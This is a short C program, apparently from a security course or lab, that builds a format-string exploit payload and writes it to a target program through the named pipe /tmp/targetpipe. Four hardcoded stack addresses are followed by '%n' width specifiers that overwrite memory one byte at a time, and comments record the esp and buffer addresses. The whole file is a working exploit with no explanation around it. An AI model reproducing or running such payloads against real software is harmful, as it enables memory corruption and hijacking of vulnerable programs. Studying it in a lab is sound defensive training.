#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[150];
  memcpy(bufr, "AAAdumm\xa0\x92\xbf\xbfzzzz\xa1\x92\xbf\xbfzzzz\xa2\x92\xbf\xbfzzzz\xa3\x92\xbf\xbf", 35);

  strcpy(bufr+35, "%08x%165u%n%253u%n%135u%n%20u%n");

  writecmd(PIPEPATH, bufr);
  
  return 0;
}
// esp: 0xbfbf08a0
// buf: 0xbfbf08ad